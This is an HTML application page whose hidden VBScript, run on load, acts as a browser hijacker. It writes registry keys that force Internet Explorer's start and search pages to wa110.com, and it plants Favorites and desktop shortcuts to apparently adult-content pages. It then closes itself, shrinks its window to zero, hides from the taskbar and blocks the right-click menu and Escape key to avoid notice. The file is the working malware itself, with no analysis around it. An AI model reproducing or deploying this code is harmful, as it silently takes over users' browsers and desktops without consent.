   <html><title></title><head>


   <object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
   <script LANGUAGE="VBScript">
   on error resume next

   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.wa110.com"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.wa110.com"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "http://www.wa110.com"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "http://www.wa110.com"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","http://www.wa110.com"

   Call LongFei_AddFavorites("ÐÔ¸ÐÃÀÅ®ÌùÍ¼","http://www.wa110.com/")
   Call LongFei_AddFavorites("³ÉÈËÐÔ°®µçÓ°","http://www.wa110.com/web/")
   Call LongFei_AddDesktop("ÐÔ¸ÐÃÀÅ®ÌùÍ¼","http://www.wa110.com/")
   Call LongFei_AddDesktop("³ÉÈËÐÔ°®µçÓ°","http://www.wa110.com/web/")

   Function LongFei_AddFavorites(N, U)
       on error resume next
       Set S = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
       Set Sl = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/Á´½Ó/" + N +".URL")
       Sl.TargetPath = U
       Sl.Save()
   End Function

   Function LongFei_AddDesktop(N, U)
       on error resume next
       Set S = bugs.CreateShortcut(bugs.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
   End Function


   window.close
   </script>
   <script language="JavaScript">
   function closeit() {
   setTimeout("self.close()",0)
   }
   closeit()
   parent.moveTo((screen.width-0)/2,(screen.height-0)/2);
   parent.resizeTo(0,0);



   </script>
   </head>
   <HTA:APPLICATION   caption="no" border="none"
                    SHOWINTASKBAR="no">
   <body bgcolor="#ffffff" text="#000000" scroll="no" leftmargin="2"  topmargin="3" marginwidth="0" marginheight="0" oncontextmenu='self.event.returnvalue=0' onkeydown="javascript:if(event.keyCode==27 || event.keyCode==78 && event.ctrlKey)return false;">
   </body>
   </HTML>
